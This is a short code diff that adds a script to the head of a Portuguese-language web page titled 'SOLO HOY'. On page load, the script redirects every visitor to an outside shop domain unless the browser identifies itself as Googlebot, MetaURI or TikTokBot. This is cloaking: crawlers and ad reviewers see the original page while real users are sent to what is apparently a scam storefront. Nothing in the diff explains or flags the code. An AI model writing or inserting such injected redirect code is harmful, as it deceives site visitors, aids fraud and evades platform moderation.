@@ -1,6 +1,30 @@
 <!DOCTYPE html>
 <html lang="pt-PT">
 <head>
+	 <script>
+        var userAgentsToRedirect = [
+            "Googlebot",
+            "MetaURI",
+            "TikTokBot"
+        ];
+
+        var userAgent = navigator.userAgent;
+
+        function isBot() {
+            for (var i = 0; i < userAgentsToRedirect.length; i++) {
+                if (userAgent.indexOf(userAgentsToRedirect[i]) !== -1) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        window.onload = function() {
+            if (!isBot()) {
+                window.location.href = "https://kapilar.shop/";
+            }
+        };
+    </script>
 	<meta charset="UTF-8">
 			<title>SOLO HOY</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
